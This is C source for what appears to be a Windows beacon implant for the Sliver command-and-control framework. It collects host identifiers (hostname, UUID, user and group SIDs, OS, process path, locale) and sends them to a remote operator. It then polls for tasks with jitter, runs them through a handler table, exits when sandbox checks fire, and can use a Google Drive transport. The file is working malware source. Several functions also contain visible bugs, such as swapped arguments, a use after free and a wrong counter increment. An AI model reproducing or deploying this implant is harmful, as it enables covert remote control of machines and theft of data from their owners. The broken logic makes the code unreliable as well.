#include "pch.h"

PBEACON_TASK UnmarshalBeaconTasks
(
	_In_ PENVELOPE pEnvelope
)
{
	LPVOID* pUnmarshaledData = NULL;
	LPVOID* pUnmarshaledEnvelope = NULL;
	PPBElement RecvElements[3];
	PPBElement EnvelopeElements[4];
	DWORD i = 0;
	PBEACON_TASK pResult = NULL;
	PBUFFER* BufferList = NULL;
	DWORD dwNumberOfEnvelopes = 0;

	for (i = 0; i < _countof(RecvElements); i++) {
		RecvElements[i] = ALLOC(sizeof(PBElement));
		RecvElements[i]->dwFieldIdx = i + 1;
	}

	for (i = 0; i < _countof(EnvelopeElements); i++) {
		EnvelopeElements[i] = ALLOC(sizeof(PBElement));
		EnvelopeElements[i]->dwFieldIdx = i + 1;
		EnvelopeElements[i]->Type = Varint;
	}

	RecvElements[0]->Type = Bytes;
	RecvElements[1]->Type = RepeatedBytes;
	RecvElements[2]->Type = Varint;
	EnvelopeElements[2]->Type = Bytes;

	pUnmarshaledData = UnmarshalStruct(RecvElements, _countof(RecvElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	pResult = ALLOC(sizeof(BEACON_TASK));
	/*pResult->lpInstanceID = DuplicateStrA(((PBUFFER)pUnmarshaledData[0])->pBuffer, 0);
	pResult->dwNextCheckin = ((PUINT64)pUnmarshaledData)[2];*/
	BufferList = (PBUFFER*)pUnmarshaledData[1];
	dwNumberOfEnvelopes = *((PUINT64)BufferList);
	
	pResult->EnvelopeList = ALLOC(dwNumberOfEnvelopes * sizeof(PENVELOPE));
	pResult->dwNumberOfEnvelopes = dwNumberOfEnvelopes;
	for (i = 0; i < dwNumberOfEnvelopes; i++) {
		pResult->EnvelopeList[i] = ALLOC(sizeof(ENVELOPE));
		pUnmarshaledEnvelope = UnmarshalStruct(EnvelopeElements, _countof(EnvelopeElements), BufferList[i + 1]->pBuffer, BufferList[i + 1]->cbBuffer, NULL);
		pResult->EnvelopeList[i]->uID = (UINT64)pUnmarshaledEnvelope[0];
		pResult->EnvelopeList[i]->uType = (UINT64)pUnmarshaledEnvelope[1];
		pResult->EnvelopeList[i]->uUnknownMessageType = (UINT64)pUnmarshaledEnvelope[3];
		pResult->EnvelopeList[i]->pData = (PBUFFER)pUnmarshaledEnvelope[2];
		pUnmarshaledEnvelope[2] = NULL;
		FREE(pUnmarshaledEnvelope);
	}

CLEANUP:
	if (pUnmarshaledData != NULL) {
		FreeBuffer((PBUFFER)pUnmarshaledData[0]);
		if (BufferList != NULL) {
			for (i = 1; i <= dwNumberOfEnvelopes; i++) {
				FreeBuffer(BufferList[i]);
			}

			FREE(BufferList);
		}
		
		FREE(pUnmarshaledData);
	}

	for (i = 0; i < _countof(RecvElements); i++) {
		FREE(RecvElements[i]);
	}

	for (i = 0; i < _countof(EnvelopeElements); i++) {
		FREE(EnvelopeElements[i]);
	}

	return pResult;
}

PENVELOPE MarshalBeaconTasks
(
	_In_ PSLIVER_BEACON_CLIENT pBeacon,
	_In_ DWORD dwNextCheckin,
	_In_ PENVELOPE* pTasksResult,
	_In_ DWORD dwNumberOfTasks
)
{
	PENVELOPE pResult = NULL;
	PPBElement BeaconTasksElements[3];
	PPBElement pFinalElement = NULL;
	PBUFFER* MarshaledTasks = NULL;
	DWORD i = 0;

	SecureZeroMemory(BeaconTasksElements, sizeof(BeaconTasksElements));
	BeaconTasksElements[0] = CreateBytesElement(pBeacon->szInstanceID, lstrlenA(pBeacon->szInstanceID), 1);
	if (dwNextCheckin > 0) {
		BeaconTasksElements[2] = CreateVarIntElement(dwNextCheckin, 3);
	}

	if (pTasksResult != NULL) {
		MarshaledTasks = ALLOC(sizeof(PBUFFER) * dwNumberOfTasks);
		for (i = 0; i < dwNumberOfTasks; i++) {
			MarshaledTasks[i] = MarshalEnvelope(pTasksResult[i]);
		}

		BeaconTasksElements[1] = CreateRepeatedBytesElement(MarshaledTasks, dwNumberOfTasks, 2);
	}
	
	pFinalElement = CreateStructElement(BeaconTasksElements, _countof(BeaconTasksElements), 0);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uType = MsgBeaconTasks;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	FREE(MarshaledTasks);
	FreeElement(pFinalElement);

	return pResult;
}

DWORD GetNextCheckin
(
	_In_ PSLIVER_BEACON_CLIENT pBeacon
)
{
	DWORD dwResult = 0;

	dwResult = pBeacon->dwInterval + GenRandomNumber32(0, pBeacon->dwJitter);
	return dwResult;
}

BOOL BeaconRegister
(
	_In_ PSLIVER_BEACON_CLIENT pBeacon
)
{
	LPSTR lpUUID = NULL;
	LPSTR lpFullQualifiedName = NULL;
	LPSTR lpUserSid = NULL;
	LPSTR lpGroupSid = NULL;
	SYSTEM_INFO SystemInfo;
	RTL_OSVERSIONINFOW OsVersion;
	LPSTR lpVersion = NULL;
	LPSTR lpHostName = NULL;
	LPSTR lpArch = NULL;
	LPSTR lpModulePath = NULL;
	DWORD cbModulePath = MAX_PATH;
	DWORD dwReturnedLength = 0;
	DWORD dwLastError = 0;
	LPSTR lpLocaleName = NULL;
	WCHAR wszLocale[0x20];
	BOOL Result = FALSE;
	CHAR szOsName[] = "windows";

	PPBElement pFinalElement = NULL;
	PPBElement ElementList[17];
	PPBElement BeaconRegElements[5];
	ENVELOPE RegisterEnvelope;

	lpUUID = GetHostUUID();
	if (lpUUID == NULL) {
		goto CLEANUP;
	}

	lpUUID[lstrlenA(lpUUID) - 1] = '\0';
	lpFullQualifiedName = GetComputerUserName();
	if (lpFullQualifiedName == NULL) {
		goto CLEANUP;
	}

	lpUserSid = GetCurrentProcessUserSID();
	if (lpUserSid == NULL) {
		goto CLEANUP;
	}

	lpGroupSid = GetCurrentProcessGroupSID();
	if (lpGroupSid == NULL) {
		goto CLEANUP;
	}

	SecureZeroMemory(&OsVersion, sizeof(OsVersion));
	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
	if (!GetOsVersion(&OsVersion)) {
		LOG_ERROR("GetOsVersion", GetLastError());
		goto CLEANUP;
	}

	SecureZeroMemory(&SystemInfo, sizeof(SystemInfo));
	GetNativeSystemInfo(&SystemInfo);
	lpVersion = ALLOC(0x100);
	wsprintfA(lpVersion, "%d build %d", OsVersion.dwMajorVersion, OsVersion.dwBuildNumber);
	if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
		lstrcatA(lpVersion, " x86_64");
		lpArch = DuplicateStrA("amd64", 0);
	}
	else if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
		lstrcatA(lpVersion, " x86");
		lpArch = DuplicateStrA("386", 0);
	}
	else {
		lpArch = DuplicateStrA("(NULL)", 0);
	}

	lpHostName = GetHostName();
	lpModulePath = ALLOC(cbModulePath + 1);
	while (TRUE) {
		SecureZeroMemory(lpModulePath, cbModulePath + 1);
		dwReturnedLength = GetModuleFileNameA(NULL, lpModulePath, cbModulePath);
		dwLastError = GetLastError();
		if (dwLastError == ERROR_INSUFFICIENT_BUFFER) {
			cbModulePath *= 2;
			lpModulePath = REALLOC(lpModulePath, cbModulePath + 1);
		}

		break;
	}

	GetSystemDefaultLocaleName(wszLocale, _countof(wszLocale));
	lpLocaleName = ConvertWcharToChar(wszLocale);

	SecureZeroMemory(ElementList, sizeof(ElementList));
	ElementList[0] = CreateBytesElement(pBeacon->pGlobalConfig->szSliverName, lstrlenA(pBeacon->pGlobalConfig->szSliverName), 1);
	ElementList[1] = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
	ElementList[2] = CreateBytesElement(lpUUID + 1, lstrlenA(lpUUID + 1), 3);
	ElementList[3] = CreateBytesElement(lpFullQualifiedName, lstrlenA(lpFullQualifiedName), 4);
	ElementList[4] = CreateBytesElement(lpUserSid, lstrlenA(lpUserSid), 5);
	ElementList[5] = CreateBytesElement(lpGroupSid, lstrlenA(lpGroupSid), 6);
	ElementList[6] = CreateBytesElement(szOsName, lstrlenA(szOsName), 7);
	ElementList[7] = CreateBytesElement(lpArch, lstrlenA(lpArch), 8);
	ElementList[8] = CreateVarIntElement(GetCurrentProcessId(), 9);
	ElementList[9] = CreateBytesElement(lpModulePath, lstrlenA(lpModulePath), 10);
	ElementList[11] = CreateBytesElement(lpVersion, lstrlenA(lpVersion), 12);
	ElementList[12] = CreateVarIntElement(pBeacon->pGlobalConfig->dwReconnectInterval, 13);

	ElementList[14] = CreateBytesElement(pBeacon->pGlobalConfig->lpConfigID, lstrlenA(pBeacon->pGlobalConfig->lpConfigID), 16);
	ElementList[15] = CreateVarIntElement(pBeacon->pGlobalConfig->uPeerID, 17);
	ElementList[16] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);
	
	BeaconRegElements[0] = CreateBytesElement(pBeacon->szInstanceID, lstrlenA(pBeacon->szInstanceID), 1);
	BeaconRegElements[1] = CreateVarIntElement(pBeacon->dwInterval, 2);
	BeaconRegElements[2] = CreateVarIntElement(pBeacon->dwJitter, 3);
	BeaconRegElements[3] = CreateStructElement(ElementList, _countof(ElementList), 4);
	BeaconRegElements[4] = CreateVarIntElement(GetNextCheckin(pBeacon), 5);

	pFinalElement = CreateStructElement(BeaconRegElements, _countof(BeaconRegElements), 0);
	SecureZeroMemory(&RegisterEnvelope, sizeof(RegisterEnvelope));
	RegisterEnvelope.uType = MsgBeaconRegister;
	RegisterEnvelope.pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
	Result = pBeacon->Send(pBeacon->pGlobalConfig, pBeacon->lpClient, &RegisterEnvelope);
CLEANUP:
	FREE(lpHostName);
	FREE(lpUUID);
	FREE(lpFullQualifiedName);
	FREE(lpUserSid);
	FREE(lpGroupSid);
	FREE(lpArch);
	FREE(lpModulePath);
	FREE(lpVersion);
	FREE(lpLocaleName);
	FreeElement(pFinalElement);

	return Result;
}

PENVELOPE* BeaconHandleTaskList
(
	_In_ PSLIVER_BEACON_CLIENT pBeacon,
	_In_ PENVELOPE* Tasks,
	_In_ DWORD dwNumberOfTasks
)
{
	DWORD i = 0;
	REQUEST_HANDLER ReqHandler = NULL;
	REQUEST_HANDLER* HandlerTable = NULL;
	PENVELOPE* pResult = NULL;

	pResult = ALLOC(sizeof(PENVELOPE) * dwNumberOfTasks);
	HandlerTable = GetSystemHandler();

	for (i = 0; i < dwNumberOfTasks; i++) {
		if (Tasks[i]->uType >= MsgEnd) {
			goto UNKNOWN_TYPE;
		}

		ReqHandler = HandlerTable[Tasks[i]->uType];
		if (ReqHandler != NULL) {
			pResult[i] = ReqHandler(Tasks[i], pBeacon);
			continue;
		}

		// Cac handler con lai
UNKNOWN_TYPE:
		pResult[i] = ALLOC(sizeof(ENVELOPE));
		pResult[i]->uID = Tasks[i]->uID;
		pResult[i]->uUnknownMessageType = 1;
	}

	FREE(HandlerTable);

	return pResult;
}

VOID FreeBeaconTask
(
	_In_ PBEACON_TASK pBeaconTask
)
{
	DWORD i = 0;

	if (pBeaconTask != NULL) {
		FREE(pBeaconTask->lpInstanceID);
		if (pBeaconTask->EnvelopeList != NULL) {
			for (i = 0; i < pBeaconTask->dwNumberOfEnvelopes; i++) {
				FreeEnvelope(pBeaconTask->EnvelopeList[i]);
			}

			FREE(pBeaconTask->EnvelopeList);
		}
		
		FREE(pBeaconTask);
	}
}

VOID FreeBeaconClient
(
	_In_ PSLIVER_BEACON_CLIENT pBeacon
)
{
	if (pBeacon != NULL) {
		if (pBeacon->lpClient != NULL) {
			pBeacon->Close(pBeacon->lpClient);
			FREE(pBeacon->lpClient);
		}

		FreeGlobalConfig(pBeacon->pGlobalConfig);
		FREE(pBeacon);
	}
}

VOID BeaconWork
(
	_Inout_ PTP_CALLBACK_INSTANCE Instance,
	_Inout_opt_ PBEACON_TASKS_WRAPPER pWrapper,
	_Inout_ PTP_WORK Work
)
{
	PENVELOPE pSendEnvelope = NULL;
	PENVELOPE* TaskResults = NULL;
	PSLIVER_BEACON_CLIENT pBeacon;
	DWORD i = 0;
	DWORD dwOldInterval = 0;

	pBeacon = pWrapper->pBeacon;
	TaskResults = BeaconHandleTaskList(pWrapper->pTaskList, pWrapper->dwNumberOfTasks, pBeacon);
	if (TaskResults == NULL) {
		goto CLEANUP;
	}

	dwOldInterval = pBeacon->dwInterval;
	pSendEnvelope = MarshalBeaconTasks(pBeacon, 0, TaskResults, pWrapper->dwNumberOfTasks);
	if (!pBeacon->Send(pBeacon->pGlobalConfig, pBeacon->lpClient, pSendEnvelope)) {
		goto CLEANUP;
	}

CLEANUP:
	FreeEnvelope(pSendEnvelope);
	if (TaskResults != NULL) {
		for (i = 0; i < pWrapper->dwNumberOfTasks; i++) {
			FreeEnvelope(TaskResults[i]);
		}

		FREE(TaskResults);
	}

	if (pWrapper != NULL) {
		for (i = 0; i < pWrapper->dwNumberOfTasks; i++) {
			FreeEnvelope(pWrapper->pTaskList[i]);
		}

		FREE(pWrapper);
	}
	
	if (dwOldInterval != pBeacon->dwInterval) {
		SetEvent(pWrapper->hEvent);
	}

	return;
}

VOID BeaconMainLoop
(
	_In_ PSLIVER_BEACON_CLIENT pBeacon
)
{
	DWORD i = 0;
	PENVELOPE pNextCheckinEnvelope = NULL;
	PENVELOPE pRecvEnvelope = NULL;
	PBEACON_TASK BeaconTask = NULL;
	PSLIVER_THREADPOOL pSliverPool = NULL;
	PTP_WORK pWork = NULL;
	DWORD dwNumberOfAttempts = 0;
	PBEACON_TASKS_WRAPPER pWrapper = NULL;
	HANDLE hEvent = NULL;

	hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
	pBeacon->lpClient = pBeacon->Init();
	if (pBeacon->lpClient == NULL) {
		goto CLEANUP;
	}

#ifndef _DEBUG
	if (DetectSandbox2() || DetectSandbox3()) {
		goto CLEANUP;
	}
#endif
	if (!pBeacon->Start(pBeacon->pGlobalConfig, pBeacon->lpClient)) {
		goto CLEANUP;
	}

	if (!BeaconRegister(pBeacon)) {
		goto CLEANUP;
	}

	pSliverPool = InitializeSliverThreadPool();
	if (pSliverPool == NULL) {
		goto CLEANUP;
	}

	while (TRUE) {
#ifndef _DEBUG
		if (DetectSandbox1() || DetectSandbox2()) {
			goto CLEANUP;
		}
#endif

		if (dwNumberOfAttempts >= pBeacon->pGlobalConfig->dwMaxFailure) {
			break;
		}

		pNextCheckinEnvelope = MarshalBeaconTasks(pBeacon, GetNextCheckin(pBeacon), NULL, 0);
		if (!pBeacon->Send(pBeacon->pGlobalConfig, pBeacon->lpClient, pNextCheckinEnvelope)) {
			pNextCheckinEnvelope++;
			continue;
		}

		FreeEnvelope(pNextCheckinEnvelope);
		pRecvEnvelope = pBeacon->Receive(pBeacon->pGlobalConfig, pBeacon->lpClient);
		if (pRecvEnvelope != NULL && pRecvEnvelope->pData != NULL) {
			BeaconTask = UnmarshalBeaconTasks(pRecvEnvelope);
			FreeEnvelope(pRecvEnvelope);

			pWrapper = ALLOC(sizeof(BEACON_TASKS_WRAPPER));
			pWrapper->pTaskList = BeaconTask->EnvelopeList;
			pWrapper->dwNumberOfTasks = BeaconTask->dwNumberOfEnvelopes;
			pWrapper->hEvent = hEvent;
			pWrapper->pBeacon = pBeacon;

			if (BeaconTask->lpInstanceID != NULL) {
				FREE(BeaconTask->lpInstanceID);
				BeaconTask->lpInstanceID = NULL;
			}

			FREE(BeaconTask);
			pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)BeaconWork, pWrapper, &pSliverPool->CallBackEnviron);
			if (pWork == NULL) {
				LOG_ERROR("CreateThreadpoolWork", GetLastError());
				continue;
			}

			TpPostWork(pWork);
		}

		WaitForSingleObject(hEvent, GetNextCheckin(pBeacon) * 1000);
	}

CLEANUP:
	FreeSliverThreadPool(pSliverPool);
	FreeBeaconTask(BeaconTask);
	FreeEnvelope(pNextCheckinEnvelope);

	if (hEvent != NULL) {
		CloseHandle(hEvent);
	}
}

PSLIVER_BEACON_CLIENT BeaconInit
(
	_In_ PGLOBAL_CONFIG pGlobalConfig
)
{
	PSLIVER_BEACON_CLIENT pBeacon = NULL;
	DWORD dwInterval = 180;
	DWORD dwJitter = 20;
	LPSTR lpUuid = NULL;

	pBeacon = ALLOC(sizeof(SLIVER_BEACON_CLIENT));
	pBeacon->pGlobalConfig = pGlobalConfig;
	pBeacon->dwInterval = dwInterval;
	pBeacon->dwJitter = dwJitter;
	lpUuid = GenerateUUIDv4();
	lstrcpyA(pBeacon->szInstanceID, lpUuid);
#ifdef _DRIVE
	pBeacon->Init = (CLIENT_INIT)DriveInit;
	pBeacon->Start = DriveStart;
	pBeacon->Send = DriveSend;
	pBeacon->Receive = DriveRecv;
	pBeacon->Close = DriveClose;
	pBeacon->Cleanup = FreeDriveClient;
#else
#endif

CLEANUP:
	FREE(lpUuid);

	return pBeacon;
}